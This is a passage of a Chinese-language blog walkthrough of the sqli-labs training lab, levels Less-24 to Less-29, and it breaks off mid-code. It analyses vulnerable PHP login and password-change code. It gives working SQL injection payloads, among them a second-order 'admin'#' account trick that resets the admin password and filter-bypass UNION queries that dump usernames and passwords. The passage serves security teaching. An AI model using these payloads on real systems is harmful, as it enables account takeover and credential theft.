title="Less-24"></a>Less-24</h2><p>一个经典的二次注入场景，所以下面 来单个理一下源码。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="https://image.3001.net/images/20200515/15895151791144.png" alt="img"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>username<span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 查询当前用户信息</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>如果当前用户已经存在 无法注册<span class="token keyword">if</span> 两次输入密码一致：  <span class="token comment"># 将记录插入数据库中</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users ( username, password) values(\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span>    查询完成后 重定向到首页<span class="token keyword">else</span><span class="token punctuation">:</span>    提示两次输入密码不一致<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>`login.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 登录用户名和密码都被过滤了</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>pass_change.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> 检测未登录：    重定向到首页<span class="token keyword">if</span> 检测到提交表单：  <span class="token comment"># 对 pass 都进行了过滤</span>  <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> 两次密码一致<span class="token punctuation">:</span>        <span class="token comment"># 直接将 username 拼接到 SQL 语句</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        提示密码不一致 并重定向到 fail<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span>  mysql_escape_string<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th align="left">危险字符</th><th align="left">转义后</th></tr></thead><tbody><tr><td align="left"><code>\</code></td><td align="left"><code>\\</code></td></tr><tr><td align="left"><code>&#39;</code></td><td align="left"><code>\&#39;</code></td></tr><tr><td align="left"><code>&quot;</code></td><td align="left"><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$curr_pass'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment"># and password='$curr_pass'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><pre class="line-numbers language-none"><code class="language-none">admin&#39;#1admin&#39;#233admin&#39;#gg...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注册完成后数据库的记录信息如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#hacker | 111        |</span>+----+---------------+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 <code>admin&#39;#hacker</code> 用户，然后来修改当前的密码：</p><p><img src="https://image.3001.net/images/20200523/15901641643476.png" alt="img"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>+----+---------------+------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>+----+---------------+------------+<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin         <span class="token operator">|</span> <span class="token number">233</span>        <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#hacker | 111        |</span>+----+---------------+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>关键代码分析：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id 直接单引号拼接</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 但是 id 被如下函数过滤了</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/AND/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了 or 和 and 关键词，但是还存在很多方法可以绕过，下面具体演示一下：</p><h3 id="双写嵌套绕过"><a href="#双写嵌套绕过" class="headerlink" title="双写嵌套绕过"></a>双写嵌套绕过</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+password&#96; 写成了 &#96;passwoorrd&#96;，&#96;SEPARATOR&#96;写成&#96;SEPARATOORR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>###符号替换</p><pre class="line-numbers language-none"><code class="language-none">or&#96; -&gt; &#96;||and&#96; -&gt; &#96;&amp;&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的， 这里不再啰嗦。</p><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 过滤了 or 和 and 大小写</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//strip out OR (non case sensitive)</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out AND (non case sensitive)</span><span class="token comment"># 过滤了 /*</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//strip out /*</span><span class="token comment"># 过滤了 -- 和 # 注释</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out --</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//Strip out #</span><span class="token comment"># 过滤了空格</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\s]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out spaces</span><span class="token comment"># 过滤了斜线</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\\\\]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out slashes</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p><p>过滤注释 可以使用闭合绕过</p><p>过滤了空格 可以使用如下的符号来替代：</p><table><thead><tr><th align="left">符号</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">%09</td><td align="left">TAB 键(水平)</td></tr><tr><td align="left">%0a</td><td align="left">新建一行</td></tr><tr><td align="left">%0c</td><td align="left">新的一页</td></tr><tr><td align="left">%0d</td><td align="left">return 功能</td></tr><tr><td align="left">%0b</td><td align="left">TAB 键(垂直)</td></tr><tr><td align="left">%a0</td><td align="left">空格</td></tr></tbody></table><p>直接上 payload 吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,passwoorrd,0x3c62723e))))x),3%0baandnd%0b&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>与 Less-26 相比，只是拼接方式改变了，因为没有输出报错信息，所以不能使用报错注入了，然后不再啰嗦，大家可以自行测试。</p><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则又增加了许多：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 过滤了 /*</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤了 -</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤了 #</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤了空格</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/m'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Select/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/SELECT/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤了 union UNION</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Union/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/UNION/s'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 大小写混写</span>unioNunIonseLect<span class="token punctuation">..</span>.<span class="token comment"># 嵌套双写</span>uunionnionsselectelectununionion<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很多种方案，不再赘述，下面直接丢 payload：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;100&#39;%0bununionion%0bseLect%0b1,(seLect(@x)FROM(seLect(@x:&#x3D;0x00) ,(seLect(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3%0band%0b&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 过滤 /*</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤 - # 注释</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 过滤 空格 +</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">.</span><span class="token comment"># 过滤 union select /i 大小写都过滤</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union\s+select/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;100&#39;)%0bunion%a0select%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%a0and%0b(&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-27 还少了几个过滤规则，这样直接丢 payload 吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39;) union%a0select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id = 'x' 的拼接方式</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> 查询到结果<span class="token punctuation">:</span>    输出查询的详细信息<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">index.php?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 